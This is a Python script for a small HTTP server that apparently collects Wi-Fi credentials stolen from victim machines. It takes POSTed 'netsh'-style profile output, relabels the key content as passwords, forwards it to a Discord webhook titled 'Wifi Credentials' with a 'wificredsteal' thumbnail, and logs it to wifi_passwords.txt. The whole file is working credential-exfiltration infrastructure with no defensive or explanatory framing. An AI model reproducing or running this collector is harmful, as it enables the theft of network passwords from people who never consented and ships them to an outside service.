from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import os
from datetime import datetime
import hashlib

def generate_hash(data):
    # Encode the data to bytes if it's a string
    if isinstance(data, str):
        data = data.encode('utf-8')

    # Create a SHA-256 hash object
    sha256_hash = hashlib.sha256()

    # Update the hash object with the data
    sha256_hash.update(data)

    # Get the hexadecimal representation of the hash
    hex_digest = sha256_hash.hexdigest()

    return hex_digest
# Replace with your actual Discord Webhook URL
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL') #os.getenv('key') is how to retrieve a sercre in replit from the key

def replace_content(text, to_change, change_to):
    return text.replace(to_change, change_to)

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    
        
    def do_POST(self):
        # Get content length
        content_length = int(self.headers['Content-Length'])

        # Read and decode the post data
        post_data = self.rfile.read(content_length).decode('utf-8')

        current_date_and_time = datetime.now()


        post_data = replace_content(post_data, "Key Content", "Password")
        post_data = replace_content(post_data, "Profile", "SSID")
        # Send the data to the Discord webhook
        payload = {
                "content": "",
                "embeds": [
                    {
                        "title": "Wifi Credentials",
                        "description": f"{post_data}",
                        "color": 5814783,
                        "thumbnail": {
                            "url": "https://flipper.mas0ng.com/pwdsteal/images/thumbnails/wificredsteal.png"
                        }
                    }
                ]
            }

        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

        
        
        
        if response.status_code == 204:
            print("Data sent to Discord webhook successfully.")
        else:
            print(f"Failed to send data to Discord webhook. Status code: {response.status_code}")

        # Append the data to a file
        with open("wifi_passwords.txt", "a") as f:
            f.write(post_data + "\n")

        # Send response back to the client
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Data received')

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = ('', 8080)
    httpd = server_class(server_address, handler_class)
    print('Starting server...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
